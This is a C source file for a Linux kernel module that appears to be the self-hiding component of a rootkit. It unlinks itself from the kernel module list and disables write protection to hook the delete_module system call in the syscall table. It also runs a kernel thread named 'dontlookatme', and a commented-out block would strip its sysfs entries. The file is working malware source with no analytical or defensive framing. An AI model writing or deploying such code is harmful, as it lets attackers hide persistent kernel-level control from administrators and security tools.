#include<linux/module.h>
#include<linux/sched.h>
#include<linux/kthread.h>
#include<linux/mutex.h>
#include<linux/list.h>
#include<linux/string.h>
#include<linux/sysfs.h>
#include<linux/moduleparam.h>

#include "hooking.h"

static struct list_head * tmp_head;
static int (*orig_sys_delete_module)(const char * name, int flags);

static int my_delete_module(const char * name, int flags){
	if(strcmp(name, "rootkit") == 0){  //TODO: replace string with macro
		printk(KERN_INFO "rootkit wants back to it's own kind\n");
		mutex_lock(&module_mutex);
		list_add(&THIS_MODULE->list, tmp_head);
		mutex_unlock(&module_mutex);
	}
	return orig_sys_delete_module(name, flags);
}

//copied from module.c:1591
static void module_remove_modinfo_attrs(struct module * mod){
	struct module_attribute * attr;
	int i;
	
	for(i = 0; (attr = &mod->modinfo_attrs[i]);i++){
		if(!attr->attr.name)	break;
		
		sysfs_remove_file(&mod->mkobj.kobj, &attr->attr);
		if(attr->free) attr->free(mod);
	}
	//kfree(mod->modinfo_attrs);
}

static int hiding_thread(void * data){
	
	mutex_lock(&module_mutex);
	printk(KERN_INFO "Module mutex acquired, hopefully this works.\n");
		
	disable_wp();
	orig_sys_delete_module = syscall_table[__NR_delete_module];
	syscall_table[__NR_delete_module] = my_delete_module;
	enable_wp();
	
	tmp_head = THIS_MODULE->list.prev;	
	list_del(&THIS_MODULE->list);
	
	mutex_unlock(&module_mutex);

	/* EXPERIMENTELL - WENN MAN DAS NUTZT, SPINNT RMMOD
	module_remove_modinfo_attrs(THIS_MODULE);
	((void (*) (struct module *)) module_param_sysfs_remove_T)(THIS_MODULE);
	kobject_put(THIS_MODULE->mkobj.drivers_dir);
	kobject_put(THIS_MODULE->holders_dir);
	*/	

	return 0;
}

void hide_code(void){
	kthread_run(hiding_thread, NULL, "dontlookatme");
}

void unhide_code(void) {
	disable_wp();
	syscall_table[__NR_delete_module] = orig_sys_delete_module;
	enable_wp();
}
